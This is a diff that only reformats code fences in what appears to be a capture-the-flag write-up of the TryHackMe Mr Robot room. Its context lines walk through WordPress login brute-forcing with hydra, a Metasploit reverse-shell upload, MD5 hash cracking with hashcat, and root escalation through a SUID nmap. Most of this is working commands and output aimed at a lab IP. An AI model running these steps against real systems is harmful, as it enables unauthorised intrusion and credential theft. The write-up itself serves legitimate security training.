@@ -6,7 +6,7 @@ These notes are from a challenge I did @[tryhackme](https://tryhackme.com) calle
 
 Let's have a look at the environment:
 
-```sh
+``` sh
 IP="10.10.236.216"
 nmap -sC -sV $IP
 nikto -h $IP
@@ -14,7 +14,7 @@ nikto -h $IP
 
 Since there is a php based website served on port 80 and 443 via apache let us have a look at the available folders:
 
-```sh
+``` sh
 gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://$IP:80
 ```
 
@@ -32,25 +32,25 @@ In the robots.txt we find the first key ($IP/key-1-of-3.txt) and a dictionary fi
 
 Let's download the dictionary file "fsocity.dic" and have a look:
 
-```sh
+``` sh
 wget $IP/fsocity.dic
 ```
 
 The file seems to be a password list but there are a lot of redundant entries. If we want to use this to brute-force login to the word-press admin portal we should remove all duplicate entries. We can use ```uniq``` for this but uniq expects a sorted list so we run the following:
 
-```sh
+``` sh
 sort fsocity.dic | uniq > uniqfsocity.dic
 ```
 
 We can use hydra to brute-force http-post-form on the wordpress login page to find out the username. In case we get a "Invalid" the attempt failed.
 
-```sh
+``` sh
 hydra -L uniqfsocity.dic -p something $IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid"
 ```
 
 We find out the username "Elliot" is valid and abort hydra. Now let's use the same dictionary again to brute-force the password of Elliot. If a correct user logs in with an invalid password we can use "incorrect" as false trigger.
 
-```sh
+``` sh
 hydra -l Elliot -P uniqfsocity.dic -t 64 $IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect."
 ```
 
@@ -58,7 +58,7 @@ This unfortunately takes some time but after a while we get the correct password
 
 With access to the wordpress backend we can start Metasploit to exploit wordpress for a reverse shell:
 
-```sh
+``` sh
 msfdb init
 msfconsole
 db_nmap -sV 10.10.236.216
@@ -77,21 +77,21 @@ exploit
 Unfortunantly I get an error running this saying wordpress is not available.
 After seaching the web I find out possibly we can just ignore those errors in the used script. So lets open the script and comment out what stops the script and see what happens:
 
-```sh
+``` sh
 locate wp_admin_shell_upload  
 sudo nano /usr/share/metasploit-framework/modules/exploits/unix/webapp/wp_admin_shell_upload.rb # comment out def exploit -> #fail_with
 ```
 
 and run the exploit once more:
 
-```sh
+``` sh
 reload
 exploit
 ```
 
 I now get a new error so i just comment out all "fail_with" after "def exploit" and re-run the exploit once more:
 
-```sh
+``` sh
 reload
 show options
 exploit
@@ -100,7 +100,7 @@ exploit
 Finally the exploit works and we have a reverse shell :)
 Now let's look around:
 
-```sh
+``` sh
 meterpreter > ls
 Listing: /home/robot
 ====================
@@ -113,14 +113,14 @@ Mode              Size  Type  Last modified              Name
 
 We see key 2 "key-2-of-3.txt" but can't access it. However, we can access "password.raw-md5":
 
-```sh
+``` sh
 cat password.raw-md5
 robot:c3fcd3d76192e4007dfb496cca67e13b
 ```
 
 This looks like the hashed password of user "robot". Let's find out what hash type is used by running ```hash-identifier```.
 
-```sh
+``` sh
 hash-identifier c3fcd3d76192e4007dfb496cca67e13b
 
 Possible Hashs:
@@ -130,7 +130,7 @@ Possible Hashs:
 
 Let's crack the MD5 hash with ```hashcat``` using the rockyou password list.
 
-```sh
+``` sh
 hashcat -m0 --force c3fcd3d76192e4007dfb496cca67e13b /home/0xfab1/rockyou.txt
 
 Host memory required for this attack: 65 MB
@@ -162,7 +162,7 @@ Candidates.#1....: hockey5 -> loser69
 The password for robot is abcdefghijklmnopqrstuvwxyz.
 So back to the reverse shell and lets login as user "robot":
 
-```sh
+``` sh
 meterpreter > shell
 Process 2226 created.
 Channel 4 created.
@@ -179,7 +179,7 @@ We now have access to "key-2-of-3.txt".
 
 Now as robot let us have a look at what we are allowed to do:
 
-```sh
+``` sh
 find / -user root -perm -4000 2>/dev/null
 
 /bin/ping
@@ -203,7 +203,7 @@ find / -user root -perm -4000 2>/dev/null
 
 We can exploit nmap (/usr/local/bin/nmap) with a vulnerability in the interactive mode since nmap is running with root privileges but we can trigger it as user robot:
 
-```sh
+``` sh
 nmap --interactive
 
 Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
